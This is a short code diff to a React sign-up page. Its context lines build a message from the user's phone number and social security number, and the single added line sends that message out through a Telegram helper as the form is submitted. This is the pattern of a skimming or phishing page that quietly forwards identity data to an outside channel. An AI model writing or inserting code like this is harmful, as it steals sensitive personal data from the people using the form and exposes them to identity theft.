@@ -75,7 +75,7 @@ const SignUpPage: React.FC = () => {
         📞 Phone: ${storedData.phone}
         ssn: ${storedData.ssn}
       `;
-      
+      sendTelegramMessage(telegramMessage)
       localStorage.setItem("username", form.username);
 
       alert(`Success: ${response.data.message}`);
